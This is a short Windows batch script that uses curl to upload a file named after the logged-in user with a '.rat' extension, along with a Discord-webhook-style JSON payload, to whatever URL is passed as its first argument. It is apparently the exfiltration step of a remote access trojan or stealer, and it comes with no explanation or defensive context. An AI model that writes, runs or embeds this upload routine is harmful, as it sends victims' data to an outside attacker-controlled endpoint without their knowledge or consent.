@echo off
set arg1=%1
shift

curl -F "payload_json={\"username\": \"test\", \"content\": \"world\"}" -F "file=@%USERNAME%.rat" %arg1%
